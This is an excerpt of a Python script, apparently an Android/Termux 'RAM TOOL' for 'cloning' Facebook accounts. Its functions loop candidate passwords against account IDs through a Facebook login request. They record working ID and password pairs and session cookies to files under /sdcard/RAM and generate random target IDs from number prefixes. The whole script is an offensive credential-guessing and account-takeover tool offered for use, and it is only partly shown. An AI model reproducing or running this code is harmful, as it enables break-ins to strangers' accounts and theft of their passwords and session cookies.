...
os.system('espeak -a 300 " Wellcome,   To,  ,ram ,Tool,"')
try:
...
try:
	os.makedirs('/sdcard/RAM')
except:
		pass
sys.stdout.write('\x1b]2;RAM-G\x07')
...
{W} [{R}+{W}]{R} OWNER   {R}:{R} RAM EXE
{W} [{R}+{W}]{W} FB ID   {R}:{W} RAM DON
{W} [{R}+{W}]{R} STATUS  {R}:{R} FREE
{W} [{R}+{W}]{R} VERSION {R}:{R} 0.9
{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{W}
{W} [{R}+{W}]{W}            \033[1;41m\033[1;37m[WELLCOME TO \033[1;42m\033[1;37mRAM TOOL]\x1b[0m
...
def menu():
			...
			print(f"{W} [{R}3{W}] {W}RANDOM CLONING")
			...
			if xd in ['1','01']:
				...
				print(f'{W} [{R}2{W}] METHOD 2  {W}[{G}FOR Old IDS{W}]')
...
def ffb1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}RAM{W}]{R} %s{W} | {R}M1 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def ffb2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}RAM{W}]{R} %s{W} | {R}M2 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def ffb3(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}RAM{W}]{R} %s{W} | {R}M3 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [RAM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAM/RAM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
...
def ffb4(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}RAM{W}]{R} %s{W} | {R}M4 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [RAM-OK] '+ids+' | '+pas+'\033[1;97m')
                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
...
def Create_menu():
	...
	print(f'{W} [{R}1{W}] {W}CREATE FILE BY RAM TOOL ')
...
def pak():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 9867,9712,9811,9722')
...
'Content-Length': '847'}
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print(f'\r\033[1;32m [RAM-OK] '+uid+' | '+pas+'\033[1;37m')
				...
				open('/sdcard/RAM/RAM-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
				ok.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
